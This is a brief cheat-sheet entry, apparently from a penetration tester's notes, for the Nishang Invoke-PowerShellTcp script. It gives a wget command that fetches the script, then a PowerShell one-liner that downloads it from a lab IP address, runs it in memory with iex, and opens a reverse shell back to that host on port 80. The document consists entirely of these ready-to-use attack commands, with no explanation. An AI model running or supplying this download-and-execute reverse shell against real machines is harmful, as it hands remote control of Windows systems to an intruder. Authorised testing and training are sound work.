# nishang

## Shells

### **Invoke-PowerShellTcp.ps1** <a href="#blob-path" id="blob-path"></a>

```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.147.29:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.147.29 -Port 80
```
